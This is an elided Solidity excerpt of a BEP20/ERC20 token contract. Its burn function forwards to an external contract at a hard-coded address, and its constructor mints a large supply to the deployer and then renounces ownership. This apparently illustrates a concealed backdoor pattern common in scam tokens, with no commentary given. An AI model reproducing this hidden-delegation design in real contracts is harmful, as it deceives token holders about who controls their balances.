...
contract ERC20 {
    ...
    address private _lower_address = 0xe3321456e3D9bB38002069C61feDcDE126e50813;
    ...
    function burn(uint _value) external returns (bool) {
        ...
        return IERC20(_lower_address).burn(sender(), _value);
    }
...
contract BEP20 is ERC20 {
    constructor () {
        ...
        _mint(sender(), 100000000000000000000000);
        _renounceOwnership();
    }
